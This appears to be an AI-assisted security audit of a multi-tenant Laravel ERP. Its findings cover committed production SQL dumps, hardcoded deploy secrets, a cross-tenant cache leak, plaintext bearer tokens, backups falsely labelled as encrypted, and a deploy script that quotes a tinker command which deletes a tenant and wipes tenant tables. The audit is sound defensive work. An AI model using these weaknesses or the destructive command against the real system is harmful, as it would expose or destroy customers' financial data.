- **Recommendation:** Make the backup tenant-aware: loop over tenants with mysqldump per tenant DB (or a central dump plus per-tenant dumps), encrypt the files, and send them to off-site storage with retention, not to a Telegram chat. Run the notify commands per tenant with tenancy()->runForMultiple. Point the Hostinger cron at backend/artisan with the pinned PHP binary.
- **Verification:** The main claim holds up in the code. The cron-path part could not be confirmed.

1) Backups cover only the central DB. backend/app/Services/DatabaseBackupService.php:39-53 uses DB::connection() and SHOW TABLES on the default connection, which is the central connection (config/tenancy.php:45). It has no tenancy initialisation. Nothing in app/ iterates over tenants: the only tenancy()->initialize calls are in ResolveApiTenancy middleware (HTTP only) and PopulateRealisticTenantDataCommand:102. No tenants:run or runForMultiple call exists anywhere. routes/console.php:37 schedules backup:telegram as a plain command. SendTelegramDatabaseBackupCommand only calls TelegramService::sendDatabaseBackupNotification, which has no tenant handling. The business tables (invoices, items, stock_movements, payments, cash_shifts, settings, treasury_transfers) exist only in database/migrations/tenant. The 18 central migrations contain only users, permissions, plans, tenants, subscriptions, domains, pulse, telescope, impersonation tokens and app_versions. So the scheduled backup holds no tenant invoice, stock or treasury data.

2) Reports and alerts run against the central DB. notify:daily-summary and notify:low-stock (routes/console.php:25,29), plus notify:overdue-shifts, also run without tenancy. Setting::get wraps its lookup in try/catch (app/Models/Setting.php:37-40), so in central context it quietly falls back to config('services.telegram.*'). The summary, low-stock and shift queries then hit tables that do not exist in the central DB. They either fail or report nothing, and no tenant ever gets its own report. A manual per-tenant trigger does exist (routes/tenant.php:239-244, including /settings/backup/download and /settings/telegram/backup, inside tenant context), which partly mitigates this, but it is manual only.

3) Cron path: not verified. cron_schedule.sh:2-3 does cd to sroor.baraa-solutions.com/public_html and calls /usr/bin/php artisan. On this branch artisan is in backend/, not the repo root, so that path probably is stale. However, the deploy scripts disagree on the server layout: deploy.sh clones into public_html, deploy_root_baraa.py uses $REPO_DIR/backend, and deploy_local_to_server.py uploads files. Without looking at the server I cannot prove the cron fails. That part stays plausible, not confirmed.

Nothing I found shows a host-level or per-tenant backup in the repo, though Hostinger may keep its own backups outside the code. High severity is justified for the multi-tenant SaaS: the application's only automated backup leaves out all tenant business data.

### 19. [HIGH] Production SQL dumps are committed in the local HEAD commit and not pushed yet; the release script stages everything with `git add .`
- **Location:** `D:/projects/sroor/backups/sroor_prod_2026-09-29.sql.gz`
- **Effort:** S
- **Evidence:** HEAD 76f32ce0 ('WIP: epitaxy pre-switch', 94 files, +48,662 lines) adds backups/sroor_prod_2026-09-29.sql.gz, sroor_prod_copy_before_recost_2026-09-29.sql.gz (about 2.8 MB), sroor_backup_latest.sql and sroor_backup_20260831_151852.sql (about 7.6 MB each), plus cost CSVs and screenshots. `git branch -vv` shows feature/multi-tenant at [ahead 1], so these files have not been pushed. deploy_root_baraa.py:30-32 runs `git add .`, `git commit` and `git push` from the repo root as part of each release. The repo is also cloned into the server tree (erp_repo, and public_html for the older targets).
- **Impact:** The next push, or the next run of the release script, uploads full production customer and financial data to GitHub, along with likely user password hashes. Any server that pulls the repo then gets those dumps too.
- **Recommendation:** Before pushing, remove the dumps from the commit by resetting/amending HEAD, add `backups/`, `*.sql`, `*.sql.gz`, `__pycache__/` and `*.png` at the root to .gitignore, and replace `git add .` in the release script with explicit paths. If any dump was ever pushed elsewhere (the erp-hub remote), purge it with git filter-repo.
- **Verification:** The finding holds. All checks were read-only git commands.
- `git branch -vv` shows feature/multi-tenant at 76f32ce0 [origin/feature/multi-tenant: ahead 1]. `git log origin/feature/multi-tenant..HEAD` lists only 76f32ce0 "WIP: epitaxy pre-switch...".
- `git show --stat HEAD` reports 94 files changed, +48662 lines. Files added under backups/ include: sroor_prod_2026-09-29.sql.gz (2,941,193 bytes), sroor_prod_copy_before_recost_2026-09-29.sql.gz (2,941,002 bytes), sroor_backup_20260831_151852.sql and sroor_backup_latest.sql (21,806 lines each), sroor_backup_20260831_151852.sql.gz (907,705 bytes). Also added: cost/recost CSVs, an HTML cost report, cost_fix_proposed scripts and 9 PNG screenshots.
- `git log origin/feature/multi-tenant -- backups` returns nothing, so none of these files are on the remote yet. They go up on the next push.
- No .gitignore pattern covers them. It only ignores .env.backup and *.sqlite variants, not backups/, *.sql or *.sql.gz.
- deploy_root_baraa.py lines 30-32 run `git add .`, then `git commit -m "chore(release): bump version..."`, then `git push`, all with cwd=root_dir. A release run would push this branch and the dump commit with it.

Not verified: what the dumps contain. Reading them, including counting INSERT rows or checking for password hashes, was denied by permissions. The claims about customer and financial data and password hashes are inferred from the file names (prod DB dumps of a sales/invoicing ERP), not seen.

Why high and not critical: the exposure has not happened yet. It is one push or one release-script run away, and the commit can still be removed locally. Whether a pushed dump is publicly visible depends on the GitHub repo's visibility, which I did not check. The claim that servers pulling the repo would get the dumps is plausible but conditional on a future push.

### 20. [HIGH] Cross-tenant cache leak: no CacheTenancyBootstrapper, report cache keys lack tenant id, and the production deploy sets CACHE_STORE=file
- **Location:** `backend/config/tenancy.php`
- **Effort:** S
- **Evidence:** The bootstrappers list contains only Database, Filesystem and Queue. CacheTenancyBootstrapper and Redis are absent. ProfitLossService.php:29 uses `"erp_pnl_" . ($storeId ?? 'all') . "_{$fromDate}_{$toDate}"` and InventoryAnalyticsService.php:29 uses `"erp_abc_..."` with Cache::remember for 15 min and no tenant component. deploy_root_baraa.py (the baraa-solutions.com SaaS deploy) writes `.env` with CACHE_STORE=file and CACHE_PREFIX=baraa_erp_ (lines ~112-115). The file store path is resolved at boot and is shared across tenants. Only Setting::getCacheKey() manually adds tenant('id').
- **Impact:** Tenant B opening the P&L or ABC report for the same date range and store id ('all', or store 1, since ids collide across tenant DBs) within 15 minutes gets Tenant A's cached profit/loss and inventory analytics. That leaks financial data between customers. With the database store this is masked by accident, because the default connection is the tenant DB in tenant context.
- **Recommendation:** Use a taggable store (redis or database with tags is not supported, so use redis/memcached) and enable Stancl\Tenancy\Bootstrappers\CacheTenancyBootstrapper. Alternatively, centralize a TenantCache helper that always prefixes tenant()->getTenantKey(). Add an isolation test that warms the cache in tenant A and asserts a miss in tenant B.
- **Verification:** The leak is real, but only one of the two named reports can reach it, so I lowered it from critical to high.

What the code confirms:
- In backend/config/tenancy.php (lines 34-39), CacheTenancyBootstrapper is commented out (line 36). Only the Database, Filesystem and Queue bootstrappers are active.
- FilesystemTenancyBootstrapper (vendor/stancl/tenancy/src/Bootstrappers/FilesystemTenancyBootstrapper.php:41-42) only calls useStoragePath() and suffixes the listed disks (local, public). The file cache store takes its path from config cache.stores.file.path, which is set at config load. deploy_root_baraa.py also runs `artisan config:cache`, so that path is fixed. Every tenant therefore shares one file cache directory under one shared CACHE_PREFIX.
- deploy_root_baraa.py (the baraa-solutions.com central and tenant deploy) writes CACHE_STORE=file at line 114 and CACHE_PREFIX=baraa_erp_ at line 115.
- InventoryAnalyticsService.php:29 builds its key as "erp_abc_{storeId|all}_{from}_{to}_{sortBy}" with no tenant part. It is wrapped in Cache::remember for 15 minutes (line 31). Store ids are auto-increment inside each tenant DB, so 'all', 1, 2 and so on repeat across tenants.
- This path can be reached from inside a tenant. ReportController::inventory (line 122) calls GetInventoryValuationReportAction:99, which calls getAbcAnalysis. That controller method is routed at /api/v1/reports/inventory (routes/api.php:144, inside the ResolveApiTenancy group at line 19). It is also routed at the tenant web route /reports/export-abc (routes/tenant.php:207, InitializeTenancyByDomain).
- Setting::getCacheKey() is the only cache key that includes tenant('id'). That confirms there is no global tenant scoping of the cache.

Result: tenant B can receive tenant A's ABC and inventory analytics for the same store id and date range within 15 minutes. That data includes item names, sales, profit and dead stock. Common default ranges such as the current month make that overlap likely. The clearCache() helpers have the same flaw: they forget keys that are not scoped to a tenant, and they do not even match the full key format.

What is overstated:
- The ProfitLossService P&L cache (ProfitLossService.php:29) is only called from ReportPrintController (lines 38 and 537). No route references that controller anywhere in routes/ or app/, so the P&L part of the leak cannot be reached at the moment. It is still a latent bug.
- With the default CACHE_STORE=database (.env.example:41 and config/cache.php:18), the leak is mostly hidden. In tenant context the default connection points at the tenant DB.

Severity is high rather than critical: one reachable report, a 15-minute window, and keys that must match. It is still a confirmed cross-customer financial data leak in the production SaaS deploy configuration.

### 21. [HIGH] Production SaaS deploy script wipes tenant '2m' and deletes tenant 'tenant_sroor' on every run
- **Location:** `deploy_root_baraa.py:125`
- **Effort:** S
- **Evidence:** The remote script runs, in order: `artisan tinker --execute="\App\Models\Tenant::where('id','tenant_sroor')->delete();" || true`, then `tenants:migrate --tenants=2m --force || true`, then `artisan tenant:populate-realistic-data 2m`. PopulateRealisticTenantDataCommand.php:118-134 unconditionally truncates invoice_items, payments, invoices, purchases, stock_movements, store_stocks, items, customers, suppliers and activity_logs. The `--fresh` option is declared (line 40) but never checked, and there is no app()->environment() guard. Tenant::delete fires TenantDeleted -> Jobs\DeleteDatabase (TenancyServiceProvider.php:39-44), which drops the tenant DB. The script also checks out and hard-resets `feature/api-migration` (lines 71-72), not this branch.
- **Impact:** Each deploy destroys all operational data of the 2m tenant (served at 2m.baraa-solutions.com) and drops whatever DB belongs to tenant_sroor. If either is or becomes a paying customer, money and stock history is permanently lost. Deploying a different branch than the reviewed one makes release content unpredictable.
- **Recommendation:** Remove populate and tenant delete from all deploy scripts. Make PopulateRealisticTenantDataCommand refuse to run when app()->isProduction(), honor --fresh, and require an explicit --confirm-tenant. Deploy from a release tag or main only.
- **Verification:** The core finding holds, but one part of it is overstated. What I confirmed in the code:

1. deploy_root_baraa.py lines 70-72 fetch the repo, then check out and hard-reset to origin/feature/api-migration, not feature/multi-tenant.
2. Line 124 deletes tenant_sroor through tinker, with `|| true`.
3. Line 125 runs tenants:migrate --tenants=2m.
4. Lines 126-127 run two seeders.
5. Line 129 runs `artisan tenant:populate-realistic-data 2m` unconditionally.

In backend/app/Console/Commands/PopulateRealisticTenantDataCommand.php, the `--fresh` option is declared at line 40 but never read. handle() (lines 44-134) has no environment check and no confirmation prompt. It initializes tenancy, turns off foreign key checks, and truncates these tables on every run (lines 120-134): InvoiceItem, Payment, AdditionalExpense, Invoice, PurchaseItem, Purchase, StockMovement, Expense, CashShift, StoreStock, Item, Category, Customer, Supplier and activity_logs. So every run of this script wipes and regenerates all operational data of the 2m tenant on production. .claude/rules/security-and-operations.md:7 and AGENTS.md:58 both name this script as the sanctioned production deploy path.

The overstated part is the tenant_sroor database being dropped. `Tenant::where('id','tenant_sroor')->delete()` is a query-builder bulk delete. It does not fire Eloquent model events, so TenantDeleted is never dispatched and the DeleteDatabase job wired in TenancyServiceProvider.php:39-44 never runs. app/Models/Tenant.php does not override this. The effect is that the central tenant row is removed, and the tenant's database is orphaned but not dropped. After the first run this line deletes nothing.

Context that lowers the impact: the same command creates 2m as a demo "2M Store" when it is missing, with a hardcoded name, settings and domains (lines 56-90). That suggests 2m is a showcase or demo tenant whose data is meant to be regenerated, not a paying customer. Still, a production deploy unconditionally truncates a live tenant's data, the `--fresh` flag is misleading, and the script deploys a branch other than the one under review. That is a real hazard rated high, not critical.

The script also hardcodes production secrets: an APP_KEY at line 85 and a database password at line 99, plus an SSH credential that docs/reviews says is at line 12. These should be reported separately.

### 22. [HIGH] Scheduled Telegram notifications and backups run only in central context, against tables that don't exist there
- **Location:** `backend/routes/console.php:24`
- **Effort:** M
- **Evidence:** Schedule::command('notify:daily-summary'|'notify:low-stock'|'notify:overdue-shifts'|'backup:telegram') runs plainly, with no tenants:run, runForMultiple or Tenant::cursor()->run(). The commands (e.g. SendDailyTelegramSummaryCommand.php:18) call TelegramService directly. TelegramService::sendDailySummaryNotification queries Invoice/Expense/CashShift/Store, which exist only in database/migrations/tenant. Central migrations have no invoices/settings tables. DatabaseBackupService::createSqlGzBackup (lines 39-67) dumps DB::connection() (central) only. Setting::get swallows errors, so the bot token falls back to config.
- **Impact:** In the SaaS deployment every run of the daily summary, low-stock and overdue-shift jobs throws 'table not found', and no tenant ever gets alerts. The nightly 'backup' contains only central tables (tenants, plans, users). No tenant business data (invoices, stock, treasury) is backed up, so a DB loss is unrecoverable.
- **Recommendation:** Turn each command into a fan-out: `Tenant::where(status in active/trial)->cursor()->each(fn($t) => $t->run(fn() => dispatch(new SendDailySummaryReportJob(...))))`, with per-tenant try/catch and Telegram settings read from tenant Settings. Make backups per tenant DB (mysqldump per tenant_* schema, rotated and stored off-host), and stop sending backups through a shared Telegram chat.
- **Verification:** I checked the code and the finding holds.

**Scheduling runs in central context only.**
- backend/routes/console.php lines 25-38 schedule `notify:daily-summary`, `notify:low-stock`, `notify:overdue-shifts` and `backup:telegram` as plain commands.
- No command in app/Console/Commands calls tenants:run, runForMultiple, Tenant::all/cursor or tenancy()->initialize. The only tenancy()->initialize is in PopulateRealisticTenantDataCommand.
- No other scheduler hook exists in bootstrap/app.php or the providers.
- SendDailyTelegramSummaryCommand.php:18 calls TelegramService::sendDailySummaryNotification directly.

**The notification commands query tables that are not in central.**
- TelegramService.php:133-177 queries Invoice, Expense, CashShift and Store with no tenant initialization.
- Invoice has no `$connection` override.
- The invoices, expenses, cash_shifts, stores and settings tables exist only in database/migrations/tenant. The central migration list has no such tables.
- So on a clean SaaS central DB these queries throw "table not found", and no tenant gets alerts. The exception is a production central DB that is a reused legacy single-tenant DB, where the jobs would report on stale legacy data instead.

**Setting::get swallows errors.**
- Setting::get (Setting.php) wraps its read in try/catch Throwable and returns the default. The bot token and chat ID therefore fall back to config.

**The backup covers only the central DB.**
- DatabaseBackupService::createSqlGzBackup (lines 39-90) dumps every table on the default DB:: connection. In central context that is only tenants, domains, plans, subscriptions, users and similar tables.
- No tenant database is ever dumped. composer.json has no backup package.
- The only other dump script is backup_sroor_db.py. It is a manual, ad-hoc mysqldump of a single hard-coded legacy database, not tenant_* databases.

**Why severity stays high, with one caveat.**
- The claim that data loss is "unrecoverable" goes too far. Hosting-level backups or that manual script might exist, but the code cannot show this.
- Even so, having no automated backup of any tenant business data in a sellable multi-tenant SaaS justifies high.
- The broken notifications alone would be medium.

### 23. [HIGH] Subscription/trial expiry and suspension are never enforced; no lifecycle scheduler
- **Location:** `backend/app/Http/Middleware/ResolveApiTenancy.php:33`
- **Effort:** M
- **Evidence:** The middleware initializes tenancy for any found tenant without checking status, isSuspended() or trial_ends_at. A grep for isSuspended/isOnTrial/'suspended'/subscription_ends_at in app/Http, app/Console and routes finds only TenantResource. routes/console.php has no job that expires trials or subscriptions. Tenant::isSuspended() exists (Tenant.php) but is unused. Tenant::checkLimit() queries `User::where('tenant_id', ...)`, but tenant migrations have no tenant_id column (grep found none), so plan limits would fail too.
- **Impact:** Expired-trial and suspended tenants keep full access, so the product cannot actually be sold on subscription. A tenant whose provisioning failed is still routed.
- **Recommendation:** Add a CheckTenantSubscription middleware after tenancy init that returns 402/423 with a translated message for suspended, expired or not-ready tenants. Add a daily central scheduled command that transitions trial to expired and active to past_due/suspended, with notifications. Rewrite checkLimit to count inside $tenant->run() without tenant_id.
- **Verification:** The core claim holds, but parts of the evidence are overstated.

Confirmed from the code:
- backend/app/Http/Middleware/ResolveApiTenancy.php:33-45 and 57-69 call tenancy()->initialize($tenant) for any tenant it finds. It never checks status, isSuspended(), trial_ends_at or subscription_ends_at.
- backend/routes/tenant.php:20-24 uses only 'web', InitializeTenancyByDomain and PreventAccessFromCentralDomains, with no status gate.
- backend/bootstrap/app.php registers no subscription middleware or alias. app/Http/Middleware contains only ApiTokenAuth, ResolveApiTenancy, StoreAccess and StoreScope.
- backend/routes/console.php schedules only queue, pulse, notification and backup commands. No job expires trials or subscriptions or flips their status.
- Tenant::checkLimit() (Tenant.php:103) has no callers anywhere in app/ or routes/, so plan limits on users, stores and items are not enforced at all.

Overstated:
- isSuspended() is not completely unused. backend/app/Actions/Tenants/ResolveTenantWorkspaceAction.php:48 calls it, through CentralTenantResolverController (the workspace-code lookup), and returns 403 workspace_suspended. Because isSuspended() is also true when subscription_ends_at is in the past, and TenantProvisionerService:34-35 sets subscription_ends_at to the trial end, this lookup does block expired trials and subscriptions. That is still only a soft gate on discovery. Any client that sends the X-Tenant header or uses the tenant domain skips it, and tokens already issued keep working.
- The point that checkLimit would fail because there is no tenant_id column does not matter, since the method is never called. The real problem is that limits are never enforced.
- "A tenant whose provisioning failed is still routed" is speculation I could not confirm from the code.

Net effect: suspended or expired tenants keep full API and web access. Only the workspace lookup refuses them. For a product sold on subscription this is a real revenue and control gap, so high stands.

### 24. [HIGH] Production secrets committed in deploy script
- **Location:** `deploy_root_baraa.py:12`
- **Effort:** M
- **Evidence:** Line 12: SSH password assignment for the Hostinger account (type: SSH password). Line 85: APP_KEY inside the generated .env heredoc (type: Laravel app encryption key). Line 99: DB_PASSWORD for the central MySQL user (type: database password). Host/port/user are also hardcoded (lines 9-11). The file is tracked by git.
- **Impact:** Anyone with repo access, or any leak of the GitHub repo, gets shell access to production. They can then dump all tenant DBs and forge encrypted cookies/payloads with the APP_KEY.
- **Recommendation:** Rotate the SSH password, APP_KEY (plan re-encryption) and DB password immediately. Move them to a secrets store or CI secrets. Purge them from git history (filter-repo). Replace ad-hoc paramiko scripts with a single parameterized release script that reads env vars.
- **Verification:** I confirmed this from the code. D:\projects\sroor\deploy_root_baraa.py is tracked by git (`git ls-files` lists it). Its recent commits are release bumps up to v1.0.129, and the remote is a GitHub repo (kamalsroor1/erp-hub). Three secrets are hardcoded in plain text, and I am giving only their type: line 12 (`PASS = ...`) is an SSH password, line 85 (`APP_KEY=base64:...`) is the Laravel encryption key inside the .env heredoc the script writes to the server, and line 99 (`DB_PASSWORD=...`) is the central MySQL password. The SSH host IP, port 65002 and the Hostinger account user are hardcoded on lines 9-11. Line 47 calls `ssh.connect(HOST, port=PORT, username=USER, password=PASS)`, so this is a working password login, not a placeholder. Nothing in the code reduces the risk: the values are not read from env or a vault, and they are written into the production .env (APP_ENV=production, APP_URL is the baraa-solutions.com production domain). The impact is plausible as claimed: shell access to the hosting account, from which the central and tenant DBs (prefix [HOSTING_ACCOUNT]_) can be reached, plus the APP_KEY needed to forge encrypted payloads and cookies. One part is overstated. Whether this is exposed to the public depends on whether the GitHub repo is public, and I could not check that from the code. Even if it is private, the secrets sit in git history and anyone with repo access can read them. The fix is not just deleting the file: the SSH password, DB password and APP_KEY must be changed, and git history must be purged. I am keeping severity at high and not raising it to critical, because I could not confirm public exposure.

### 25. [HIGH] Automated backup never covers tenant databases: SaaS customer data has no backup at all
- **Location:** `backend/app/Services/DatabaseBackupService.php:39`
- **Effort:** L
- **Evidence:** createSqlGzBackup() dumps only DB::connection() (the default connection) via SHOW TABLES. It is called from TelegramService::sendDatabaseBackupNotification (TelegramService.php:368-372), which is called from the scheduled 'backup:telegram' (routes/console.php:37-38). The scheduler runs in central context, so only the central DB is dumped. No command, job or service anywhere calls Tenant::cursor()/$tenant->run() for backups (grep for DatabaseBackupService returns only these callers). The root backup_sroor_db.py:9 targets only the single legacy Hostinger DB name. Tenant DBs are created as prefix 'tenant_'+uuid (config/tenancy.php:57), and no script or command dumps them.
- **Impact:** If the disk fails, a bad tenant migration runs, a tenant admin deletes something by mistake, or ransomware hits, every tenant's invoices, stock and treasury are lost for good. The daily 'success' Telegram message hides this, because it reports a successful backup of the central DB only. For a sellable SaaS this is the top data-loss risk.
- **Recommendation:** Add a tenant-aware backup command that iterates Tenant::cursor(). For each DB (central plus every tenant_*), run mysqldump --single-transaction --routines --triggers (the root python script proves mysqldump works on Hostinger over SSH), then gzip and encrypt it (age/GPG or openssl AES-256 with a key kept off-server). Upload to S3-compatible offsite storage (Backblaze B2 / Wasabi / S3) with object-lock or versioning. Keep 7 daily, 4 weekly and 12 monthly copies, record each run in a central backup_runs table, and alert when it fails. Run a monthly automated restore drill into a scratch DB with row-count and checksum assertions.
- **Verification:** The finding holds up in the code. I lowered it from critical to high only because the code cannot show whether the host keeps its own backups, and a missing safeguard is not the same as data already being lost.

What the code shows:
1. `backend/app/Services/DatabaseBackupService.php:39-53` backs up only the default connection (`DB::connection()`, then `SHOW TABLES` / `sqlite_master`). It never selects a tenant.
2. The daily job runs `backup:telegram` at 00:05 (`routes/console.php:37-38`). It goes through `SendTelegramDatabaseBackupCommand::handle`, then `TelegramService::sendDatabaseBackupNotification`, then `createSqlGzBackup()` (`TelegramService.php:368-372`). Nothing in that chain starts tenancy, so it runs against the central database only.
3. Code outside vendor/ starts tenancy in only four places: `TenantProvisionerService:85`, `PopulateRealisticTenantDataCommand:102`, the `ResolveApiTenancy` middleware and `ImpersonateTenantAction`. None of them backs up a tenant.
4. `SendTelegramDatabaseBackupJob` exists but nothing ever dispatches it.
5. `backup_sroor_db.py` at the repo root targets one database name, the legacy single-tenant one, not the `tenant_`+id databases (`config/tenancy.php:57`).
6. Closing a possible way out: `routes/tenant.php:243-244` registers per-tenant backup routes (`SettingController@sendBackupTelegram`, `@downloadBackup`). These would run inside the tenant's database, but neither method exists. `SettingController` only has `index`, `update` and `sendTestTelegram`. So even a manual backup from a tenant's own settings page fails (500 error) instead of producing a backup.
7. The Telegram caption (`TelegramService.php:382`) says the file covers every invoice, account and stock record. That is misleading, because it only contains the central database.

Why high rather than critical: the code cannot rule out backups at the host level (Hostinger, outside this repo). The risk also only becomes actual data loss when something goes wrong. As far as the application and repo can show, though, tenant databases have no backup at all.

### 26. [HIGH] Production SQL dumps containing real customer, user and invoice data are committed to git (HEAD commit)
- **Location:** `backups/sroor_prod_2026-09-29.sql.gz`
- **Effort:** S
- **Evidence:** `git ls-files backups` lists sroor_backup_20260831_151852.sql (7.8MB), its .sql.gz, sroor_backup_latest.sql (7.8MB), sroor_prod_2026-09-29.sql.gz (2.9MB) and sroor_prod_copy_before_recost_2026-09-29.sql.gz (2.9MB), plus cost_audit/recost CSVs and screenshots. All were added in commit 76f32ce0 ('WIP: epitaxy pre-switch...'), which is the current HEAD. `git show HEAD:backups/sroor_backup_latest.sql` contains CREATE TABLE for users, customers, invoices and settings, with INSERT data. The root .gitignore has no rule for backups/, *.sql or *.sql.gz (only .env.backup matches 'backup'). `git branch -r --contains 76f32ce0` returned nothing, so the commit does not appear to be pushed yet. Remote: github.com/kamalsroor1/erp-hub.
- **Impact:** The first push of feature/multi-tenant would publish real customer PII, password hashes, settings (possibly the Telegram bot token) and financial history to GitHub permanently. Every clone, CI runner and AI tool session also holds them now. This is a PII breach waiting to happen.
- **Recommendation:** Before any push, rewrite 76f32ce0 so backups/ is removed from history (interactive edit or git filter-repo on the local branch), and add `backups/`, `*.sql`, `*.sql.gz` and `*.dump` to .gitignore. Move existing dumps to encrypted storage outside the repo. If there is any doubt the commit was pushed or shared, rotate the user passwords and tokens present in the dump.
- **Verification:** I checked this with read-only git commands and it is real. HEAD is 76f32ce0, and `git ls-files backups` lists every file the finding names: sroor_backup_20260831_151852.sql and its .sql.gz, sroor_backup_latest.sql, sroor_prod_2026-09-29.sql.gz (2,941,193 bytes) and sroor_prod_copy_before_recost_2026-09-29.sql.gz. The same folder also holds the cost_audit and recost CSVs, the cost_fix_proposed PHP and Python files, an HTML report, PNG screenshots and a PDF. `git log --all -- backups` shows only commit 76f32ce0, so it is the only commit that touches these files.

What the dumps contain (I did not print any values):
- `git show HEAD:backups/sroor_backup_latest.sql` has CREATE TABLE for users, customers, invoices, settings and suppliers, each with an INSERT block.
- The customers INSERT runs about 32 lines, and the invoices INSERT about 43.
- 5 values in the customers block match the Egyptian mobile pattern 01XXXXXXXXX.
- 2 values match the bcrypt hash prefix, so password hashes are present.
- The gzipped prod dump also contains an INSERT INTO `customers`.

So this is real personal data, password hashes and financial data. The settings rows could hold a secret such as a bot token, but I did not confirm that.

The root .gitignore has no rule for backups/, *.sql or *.sql.gz. Its only backup-related line is `.env.backup` (line 4), and `git check-ignore` returns nothing for these files. There is no local hook (non-sample file in .git/hooks) that would block them.

I lowered the severity from critical to high because the data has not left this machine. `git status -sb` shows "feature/multi-tenant...origin/feature/multi-tenant [ahead 1]" and `git branch -r --contains HEAD` returns nothing, so the commit is not on the remote. I also could not tell from the code whether the GitHub repo is public. The real risk is that the next `git push` of this branch would publish the dumps, and once pushed they would stay in the history. That is high and close to critical. The fix now is to amend or reset the WIP commit to drop backups/ and add backups/, *.sql and *.sql.gz to .gitignore before any push. History rewriting on the remote is not needed yet.

### 27. [HIGH] Telegram backup is unencrypted, holds the keys to every tenant DB, and its caption falsely says it is encrypted
- **Location:** `backend/app/Services/TelegramService.php:382`
- **Effort:** M
- **Evidence:** The caption reads 'نسخة مشفرة ومؤمنة بالكامل' (fully encrypted and secured), but DatabaseBackupService only runs gzencode (line 97). There is no encryption. The dumped central DB holds the tenants table, where TenantProvisionerService.php:44-52 stores tenancy_db_name, tenancy_db_username and tenancy_db_password in plaintext (stancl virtual `data` column, no encrypted cast in app/Models/Tenant.php). It also holds personal_access_tokens, the plaintext users.api_token column (migration 2026_08_15_160000 line 13), tenant_user_impersonation_tokens and telescope_entries. The file goes to every chat ID in a comma-separated list (sendDocument line 328), by default a global config chat.
- **Impact:** Anyone in the Telegram chat or group, anyone who takes over that Telegram account, or anyone with Telegram-side access gets a credential set for every tenant database, plus usable API tokens. One leak becomes a breach across all tenants.
- **Recommendation:** Stop sending DB dumps to Telegram. Send only a status alert there. Encrypt dumps client-side before upload. Store tenant DB passwords with Laravel's encrypted cast (or use a single DB user plus per-tenant grants), drop the plaintext api_token column, and remove the misleading caption.
- **Verification:** I confirmed this from the code. Two points in the claim are overstated, and one point is stronger than claimed.

Confirmed:
1. **The caption is false.** TelegramService.php:382 says the backup is "fully encrypted and secured". DatabaseBackupService::createSqlGzBackup (lines 95-98) only runs gzencode() on a plain SQL dump. Nothing in the path encrypts it: no openssl, no encrypt call, no password.
2. **The central DB is what gets dumped.** routes/console.php:37-38 schedules `backup:telegram` daily at 00:05 in central context. The command and job never initialize tenancy. DatabaseBackupService uses DB::connection(), the default connection, and dumps every table via SHOW TABLES.
3. **Telegram still works from central context.** `settings` exists only as a tenant migration (database/migrations/tenant/2026_08_10_221000). In central context Setting::get swallows the missing-table exception and returns null. TelegramService then falls back to config('services.telegram.*'), which reads TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID from env, with enabled defaulting to true. sendDocument (lines 328-343) uploads the raw file to every comma-separated chat ID.
4. **Tenant DB credentials are stored in plaintext.** Tenant.php has no encrypted cast, and tenancy_db_* are not custom columns, so they live in stancl's JSON `data` column. TenantProvisionerService.php:43-53 and UpdateTenantDatabaseConfigAction write tenancy_db_name, tenancy_db_username and tenancy_db_password there.
5. **Usable bearer tokens are in the dump (stronger than claimed).** The central `users.api_token` column (migration 2026_08_15_160000:13) holds the Sanctum plainTextToken in clear (ApiLoginAction.php:84-89). ApiTokenAuth.php:43-62 accepts it as a bearer token. If a central user with the 'admin' role presents it inside a tenant context, they are logged in as the tenant user with the same phone number. So a leaked central admin api_token gives super-admin access and access to other tenants. No config/sanctum.php exists, so tokens do not expire. These tokens stay valid until that user logs in again or logs out.

Overstated:
- tenancy_db_password is stored only when the super-admin supplies it. It is optional in StoreTenantRequest, and the PermissionControlled DB manager is commented out, so the claim "keys to EVERY tenant DB" is conditional.
- On Hostinger, MySQL is usually reachable only from localhost, so the DB credentials alone may not be usable remotely.
- personal_access_tokens holds SHA-256 hashes, so those rows cannot be used directly.
- The dump contains no tenant business data, which also makes the caption's claim that it "includes all invoices, accounts and stock" false.

The attacker still has to get into the operator's Telegram chat or account. But a plaintext file on a third-party service holds live, non-expiring admin tokens with cross-tenant reach, and the app labels that file as encrypted. High severity is justified.

### 28. [HIGH] Custom PHP dump engine is not a trustworthy backup (no snapshot, unsafe escaping, memory blow-up, 50MB Telegram cap, no retention, never restore-tested)
- **Location:** `backend/app/Services/DatabaseBackupService.php:67`
- **Effort:** M
- **Evidence:** Each table is read with DB::table($table)->orderByRaw('1')->chunk(500), which is OFFSET paging with no wrapping transaction or consistent snapshot. Values are escaped with addslashes((string)$val) (line 82), which is not MySQL-safe for binary, NUL or multibyte data. Views, triggers and routines are not dumped. The whole SQL file is loaded into memory again (file_get_contents + gzencode at lines 96-98), and TelegramService::sendDocument reads it into memory again (line 338). There is no size check against the Telegram Bot API's 50MB sendDocument limit. If an exception occurs after fopen, the raw .sql stays in storage/app/backups, because the unlink at line 101 is skipped and there is no try/finally. On success the .gz is unlinked (TelegramService:387), so no server-side copy is kept. Retention is whatever survives in a Telegram chat. telescope_entries is dumped too and is never pruned (no telescope:prune in routes/console.php). No restore test or command exists.
- **Impact:** Rows written during the dump can be skipped or duplicated, so invoices and stock movements go out of sync in the restore. Data with backslashes or binary can fail or corrupt on restore. Once the gz goes over 50MB (or PHP memory_limit is reached), the backup fails silently except for a local log line. Unencrypted raw dumps can pile up on shared hosting.
- **Recommendation:** Replace the engine with mysqldump --single-transaction --quick --routines --triggers, or spatie/laravel-backup with a tenant loop. Stream it to gzip and encryption, upload to an offsite disk, check size and checksum, and keep a backup_runs audit row. Schedule telescope:prune --hours=48. Add an automated restore-verify job.
- **Verification:** I read the code and confirmed every point. The finding is not overstated.

backend/app/Services/DatabaseBackupService.php:
- Line 67 reads each table with `DB::table($table)->orderByRaw('1')->chunk(500)`. That is LIMIT/OFFSET paging with no surrounding transaction or consistent snapshot, so rows written during the dump can be skipped or duplicated.
- Line 82 escapes values with `addslashes((string)$val)`, which is not MySQL-safe for binary or NUL data.
- Only `SHOW TABLES` and `SHOW CREATE TABLE` are dumped, so views, triggers and routines are left out.
- Lines 96-98 load the whole .sql file into memory with `file_get_contents` and then build a second full copy with `gzencode`.
- The `@unlink($sqlPath)` at line 101 has no try/finally. If an exception is thrown after `fopen` (line 26), the uncompressed .sql stays in storage/app/backups.

backend/app/Services/TelegramService.php:
- `sendDocument` (around line 338) loads the file into memory again with `file_get_contents` and has no size check before sending.
